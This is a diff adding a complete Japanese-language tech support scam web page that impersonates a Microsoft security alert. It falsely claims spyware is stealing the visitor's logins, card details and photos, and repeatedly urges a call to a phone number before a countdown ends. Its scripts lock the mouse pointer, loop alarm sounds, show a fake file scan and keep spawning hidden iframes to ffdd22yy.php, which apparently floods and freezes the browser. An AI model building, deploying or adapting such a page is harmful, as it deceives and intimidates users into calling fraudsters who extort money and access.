@@ -1,0 +1,568 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Official_Windows_Alert_009d2x</title>
+<link rel="stylesheet" href="style.css">
+<link rel="icon" href="favicon.png" type="image/png" sizes="16x16">
+
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140409011-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-140409011-1');
+</script>
+
+<script src="jquery-3.2.1.min.js" type="text/javascript"></script>
+<style>
+
+
+.blinkx {
+background-color:green;
+  animation: blink-animation 1s steps(5, start) infinite;
+  -webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+
+.blink1 {
+background-color:green;
+  animation: blink-animation 1s steps(5, start) infinite;
+  -webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+</style>
+
+<style>
+
+
+
+/* The Modal (background) */
+.modal1 {
+  position: fixed; /* Stay in place */
+  z-index: 99999; /* Sit on top */
+  padding-top: 0px; /* Location of the box */
+  left: 0px;
+  top: 0px;
+  width: 100%; /* Full width */
+  height: 100%; /* Full height */
+  overflow: auto; /* Enable scroll if needed */
+  background-color: rgb(0,0,0); /* Fallback color */
+  background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+  font-family:arial; font-weight:900;
+}
+
+/* Modal Content */
+.modal-content1 {
+  position: relative;
+  background-color: blue;
+  margin: auto;
+  padding: 0;
+  right: 100px;
+  /*border: 1px solid #888;*/
+  width: 45%;
+  box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
+  -webkit-animation-name: animatetop;
+  -webkit-animation-duration: 0.4s;
+  animation-name: animatetop;
+  animation-duration: 0.4s
+}
+
+/* Add Animation */
+@-webkit-keyframes animatetop {
+  from {top:-300px; opacity:0}
+  to {top:0; opacity:1}
+}
+
+@keyframes animatetop {
+  from {top:-300px; opacity:0}
+  to {top:0; opacity:1}
+}
+
+/* The Close Button */
+.close {
+display:none;
+  color: white;
+  float: right;
+  font-size: 28px;
+  font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+  color: #000;
+  text-decoration: none;
+  cursor: pointer;
+}
+
+.modal-header1 {
+  padding: 2px 20px;
+  background-color: blue;
+  color: white;
+
+}
+.modal-header1 h2
+{
+border:none;
+font-size:42px;
+}
+
+.modal-body {padding: 2px 20px;color:white;}
+
+.modal-footer1 {
+  padding: 2px 10px;
+  background-color: blue;
+  color: white;
+  height:80px;
+
+}
+
+.modal-footer1 btn{
+background-color:black;
+}
+
+
+
+
+</style>
+
+<style>
+
+
+
+.blink11 {
+
+color: green;
+  animation: blink-animation 1s steps(5, start) infinite;
+  -webkit-animation: blink-animation 1s steps(5, start) infinite;
+}
+
+@keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+@-webkit-keyframes blink-animation {
+  to {
+    visibility: hidden;
+  }
+}
+</style>
+
+
+<style media="screen">
+
+body{
+cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair;"
+}
+
+</style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+
+</head>
+<body class="Windows" style="cursor: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAMAAAD04JH5AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAPUExURQAAAAICAgAAAP///5WVlXiCGdAAAAADdFJOUwD8ZX+n/7gAAABvSURBVHja7dbBAUAwEABBQf81i6CGfZipYB3J2bY/GnnAHgec9QjOY9QBccEMaAvugLRgBZQFT0BY8AZ0BV9AVvB8hEt3D8SnYIz2FMxtlI7gfvVzBN1OXM9+1Dsx/ykAAAAAAAAAAAAAAAAAgNcFnc4A9qwo+wMAAAAASUVORK5CYII=&quot;) 128 128, crosshair; " id="mycanvas">
+
+<div style="position:absolute; left:10px; top:10px; z-index:-1;">
+
+</div>
+
+<div id="chrome-alerts" class="chrome-alert">
+    <div>
+
+        <h1> セキュリティ警告：</h1>
+        <div class="content-box" id="alert-content-box">
+              <p>** Microsoft警告アラート **<br>
+            <br>ERROR # 268d3x8938(3)<br>
+            <br>
+            <br>すぐに電話してください：  <span style="font-size: 13pt;font-weight: bold">(050) 3136-6601</span> （通話料無料）<br>
+       この重大なアラートを無視しないでください。<br><br>
+            </br> このページを閉じると、ネットワークへのさらなる損傷を防ぐために、コンピューターへのアクセスが無効になります。
+           <br/> お使いのコンピューターは、ポルノスパイウェアとリスクウェアに感染していることを警告しています。
+       <br/>
+                <br/> 1.Facebookログイン
+                <br/> 2.クレジットカードの詳細
+                <br/> 3.メールアカウントログイン
+                <br/> 4.このコンピューターに保存されている写真
+            <br/>
+            <br/> コンピュータが無効になったり、情報が失われたりしないように、5分以内に電話でお問い合わせください。</br>
+            ERROR #268d3x8938<br>
+          <span style="font-size: 35px;font-weight: bold;" class="blink11">(050) 3136-6601</span></div>
+        <label style="font-size: 12px;">
+              <input type="checkbox">
+              このページが追加のダイアログを作成しないようにします。</label> <br> <br>
+        <div class="action_buttons"> <a style="color:#fff;background:#8B0000; padding:10px 10px;font-size: 11pt;font-weight: bold;" href="javascript:;" class="active blinkx" id="leave_page">Back to safety</a> </div>
+    </div>
+</div>
+
+<img src="Image 2.jpg" style="position:absolute; left:30px; top:25px; z-index:-1; " />
+
+<script>
+// Get the modal
+var modal = document.getElementById('myModal');
+
+// Get the button that opens the modal
+var btn = document.getElementById("myBtn");
+
+// Get the <span> element that closes the modal
+var span = document.getElementsByClassName("close")[0];
+
+// When the user clicks the button, open the modal
+/*btn.onclick = function() {
+  modal.style.display = "block";
+} */
+
+// When the user clicks on <span> (x), close the modal
+span.onclick = function() {
+  modal.style.display = "none";
+}
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+  if (event.target == modal) {
+    modal.style.display = "none";
+  }
+}
+</script>
+  <script type="text/javascript">
+function addEvent(obj, evt, fn) {
+    if (obj.addEventListener) {
+        obj.addEventListener(evt, fn, false);
+    }
+    else if (obj.attachEvent) {
+        obj.attachEvent("on" + evt, fn);
+    }
+}
+addEvent(window,"load",function(e) {
+    addEvent(document, "mouseout", function(e) {
+        e = e ? e : window.event;
+        var from = e.relatedTarget || e.toElement;
+        if (!from || from.nodeName == "HTML") {
+            // stop your drag event here
+            // for now we can just use an alert
+         //alert("hello");
+
+			 modal.style.display = "block";
+
+        }
+    });
+});
+
+  $(document).mousemove(function(){
+  var canvas = document.getElementById('mycanvas');
+canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
+canvas.requestPointerLock();
+
+  //capture mouse movement event
+     // remove our layover from the DOM
+  });
+
+ //  $(document).mousemove(function(){
+ // alert("move detect");
+  //capture mouse movement event
+ //   $("#pageLayover").remove(); // remove our layover from the DOM
+ // });
+
+
+</script>
+
+
+<div id="progress-bar">
+<div class="progress">
+    <div class="indeterminate"></div>
+</div>
+</div>
+
+
+
+<div id="progress-bar" class="progress-bar-bottom">
+<div class="progress">
+    <div class="indeterminate"></div>
+</div>
+</div>
+<!--<div style=" margin-left:129px;">
+<img  src="mslogo.png" style="width:15%">
+</div>-->
+<div id="landing-page">
+<!-- Preloader -->
+<img src="microsoft.png" style="position: fixed;
+    top: 5px;
+    right: 64px;
+    width: 328px;
+    text-align: center;
+     " >
+<div id="preloader">
+<div class="cssload-container">
+	<div class="cssload-bouncywrap">
+		<div class="cssload-cssload-dotcon cssload-dc1">
+		<div class="cssload-dot"></div>
+	</div>
+	<div class="cssload-cssload-dotcon dc2">
+		<div class="cssload-dot"></div>
+	</div>
+	<div class="cssload-cssload-dotcon dc3">
+		<div class="cssload-dot"></div>
+	</div>
+	</div>
+</div>
+
+</div>
+<!--<img src="../../../../Mac_pages/commen/img/close.png" style="position:fixed; top:0px; right:0px;" width="104px" height="20px"/>-->
+<div id="warning-error" style="position:fixed; top:84px; right:50px; width:400px; background:rgba(0,0,0,.1); padding:15px; border-radius:5px;">
+
+
+
+<div class="attention blink" style="float:left; margin-right:20px; opacity:0;">
+
+<svg height="100" version="1.1" viewBox="0 0 16 16" width="100" xmlns="http://www.w3.org/2000/svg" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" xmlns:xlink="http://www.w3.org/1999/xlink"><title/><defs/><g fill="none" fill-rule="evenodd" id="Icons with numbers" stroke="none" stroke-width="1"><g fill="#fff" id="Group" transform="translate(-768.000000, -336.000000)"><path d="M776,337 L784,351 L768,351 Z M775,347 L775,349 L777,349 L777,347 Z M775,341 L775,346 L777,346 L777,341 Z M775,341" id="Triangle 292"/></g></g></svg></div>
+
+誰かがあなたの銀行の詳細、クレジットカードの詳細、その他のログインを盗もうとしています。 マイクロソフトに電話してください <strong style="font-size:18px;">(050) 3136-6601 </strong>データ損失を防ぐためにすぐに。 </div>
+
+<div class="warning_message">
+<p style="color: yellow;
+    font-size: 22px;
+    position: fixed;
+    top: 190px;
+    right: 50px;">で開始する際のハードドライブの安全性の削除 <span id="countdown" style="font-weight:bold;">5:00</span>
+    </p><!--<input type="submit" value="Click here to stop" style="font-size:18px; float: left; color:#F00; font-weight:200; text-align:right; margin:0 auto;" />-->
+    <h2>あなたのデータは危険にさらされています</h2>
+<p style="font-size:18px;position: relative;
+top: 20px;">問題を即座に修正し、データの損失を防ぐため<br />
+<span class="blink" style="font-size:22px;">フリーダイヤルに電話する：</span>  <strong style="font-size:30px;">(050) 3136-6601</strong></p>
+</div>
+</div>
+
+
+<div style="position:fixed; bottom:50px; right:50px; width:100%; opacity:.7;">
+<div style="font-size:42px; font-weight:200; text-align:right; margin:0 auto;">scanning complete <br />
+<span class="tabs_percent" style="font-size:72px;position:fixed; bottom:10px;right:50px;  font-weight:bold;">27%</span></div>
+<ul id='scanning' style="float:right;">
+    <li class='frame'>C:\WINDOWS\system32\acctres.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\aclui.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\ACTIVEDS.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\actxprxy.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\ADVAPI32.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\ADVPACK.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\apphelp.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\ASYCFILT.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\ATL.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\ATTRIB.exe</li>
+    <li class='frame'>C:\WINDOWS\system32\AUDIOSRV.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\AUTHZ.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\AUTOCHK.exe</li>
+    <li class='frame'>C:\WINDOWS\system32\CDM.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\CLUSAPI.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\desk.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\devmgr.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\GDI32.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\avifil32.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\hid.dll</li>
+    <li class='frame'>C:\WINDOWS\system32\ieui.dll</li>
+</ul>
+</div>
+
+
+
+<div id="myModal" class="modal1" style="display:inline-block; ">
+
+  <!-- Modal content -->
+  <div class="modal-content1">
+    <div class="modal-header1">
+      <span class="close">&times;</span>
+      <h2 style="font-size:30px">マイクロソフトセキュリティ警告アラート </h2> <span style="font-size:18px;">Call Support Now <span style="font-size:28px;">(050) 3136-6601</span> （通話料無料）<span>
+    </div>
+
+    <div class="modal-footer1"style="font-size: 18px; border:none">
+
+
+    <div style="float:right; padding-top:15px;"><strong class="active" style="padding:10px;background-color:blue;border:2px solid #fff;">安全に戻る</strong>&nbsp;&nbsp;&nbsp; <button class="active blinkx"  style="background-color:green;border:2px solid #fff; padding:10px;font-weight:bold; color:#fff; font-size:14px">今すぐ終了</button></div>
+
+
+    </div>
+  </div>
+
+</div>
+
+
+
+<script src="jquery.min.js"></script>
+<script src="scripts.js"></script>
+
+  <audio autoplay="autoplay" loop="" id="msgSound1">
+    <source src="err.mp3" type="audio/mpeg">
+  </audio>
+
+  <audio autoplay="autoplay" loop="" id="msgSound">
+    <source src="beep.mp3" type="audio/mpeg">
+  </audio>
+
+
+  		<script type="text/javascript">/*<![CDATA[*/
+  		// audio play /*
+  			var msgAudioEl = document.getElementById("msgSound");
+
+  			var playMsgInt = setInterval(function () {
+  				if (isPlaying(msgAudioEl)) {
+  					// console.log('already playing. clearing interval');
+  					clearInterval(playMsgInt);
+  				} else {
+  					// console.log('Triggering play');
+  					msgAudioEl.play();
+  				}
+  			}, 500);
+  			// audio play */
+
+  		</script>
+
+      		<script type="text/javascript">/*<![CDATA[*/
+      		// audio play /*
+      			var msgAudioEl = document.getElementById("msgSound1");
+
+      			var playMsgInt = setInterval(function () {
+      				if (isPlaying(msgAudioEl)) {
+      					// console.log('already playing. clearing interval');
+      					clearInterval(playMsgInt);
+      				} else {
+      					// console.log('Triggering play');
+      					msgAudioEl.play();
+      				}
+      			}, 500);
+      			// audio play */
+
+      		</script>
+
+
+
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+                          <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>
+
+
+
+           <!--add below lines where ever you want to use-->
+
+
+
+          <style>.iframe{visibility:hidden}</style>
+
+
+
+          <script type="text/javascript">/*<![CDATA[*/
+
+           function get_browser(){
+          		var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+          		if(/trident/i.test(M[1])){
+          				tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
+          				return {name:'IE',version:(tem[1]||'')};
+          				}
+          		if(M[1]==='Chrome'){
+          				tem=ua.match(/\bOPR\/(\d+)/)
+          				if(tem!=null)   {return {name:'Opera', version:tem[1]};}
+          				}
+          		M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
+          		if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
+          		return {
+          			name: M[0],
+          			version: M[1]
+          		};
+           }
+           var InternetEx=window.navigator.appVersion.indexOf("MSIE")!=-1;
+          var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+          var browser=get_browser();
+          if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)) ){
+          	if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
+          		{
+
+          			 function msg_ff() {
+
+          						var i = document.createElement("div");
+          						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>';
+          						document.body.appendChild(i);
+
+          				}
+          				window.setInterval(function() {
+          						msg_ff();
+
+          				}, 1100);
+
+          			}
+          	else{
+          			function msg_ff() {
+
+          						var i = document.createElement("div");
+          						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="ffdd22yy.php"></iframe></div>';
+          						document.body.appendChild(i);
+          				}
+          				window.setInterval(function() {
+          						msg_ff();
+
+          				}, 1100);
+
+          		}
+
+           }
+           else{
+
+          	 }
+
+
+          /*]]>*/</script>
+
+
+<script src="js/main.js" type="text/javascript"></script>
+<iframe id="calendar" src="err.mp3" allow="autoplay" style="display:none;" loop>
+</body>
+</html>
